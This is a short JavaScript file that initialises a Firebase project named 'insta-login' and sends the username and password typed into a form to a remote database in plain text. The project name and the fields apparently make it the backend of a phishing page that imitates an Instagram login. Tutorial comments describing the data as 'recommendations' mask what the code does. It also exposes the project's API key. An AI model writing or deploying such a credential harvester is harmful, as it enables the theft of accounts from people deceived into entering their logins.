
// Your web app's Firebase configuration
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
var config = {
  apiKey: "AIzaSyA4Xax8d1ZzbUeoyPROmuTn7hJEO97hdgE",
  authDomain: "insta-login-2c1d5.firebaseapp.com",
  databaseURL: "https://insta-login-2c1d5-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "insta-login-2c1d5",
  storageBucket: "insta-login-2c1d5.appspot.com",
  messagingSenderId: "343052418229",
  appId: "1:343052418229:web:ab4ec00f7c76b1ca8292fc",
  measurementId: "G-S0EW81NVSH"
};


firebase.initializeApp(config);

// Reference to the recommendations object in your Firebase database
var recommendations = firebase.database().ref("/");

// Save a new recommendation to the database, using the input in the form
var submitRecommendation = function () {

  // Get input values from each of the form elements
  var username = $("#username").val();
  var password = $("#password").val();

  // Push a new recommendation to the database using those values
  recommendations.push({
    "username": username,
    "password": password
  });
};


$("#contactForm").submit(submitRecommendation);

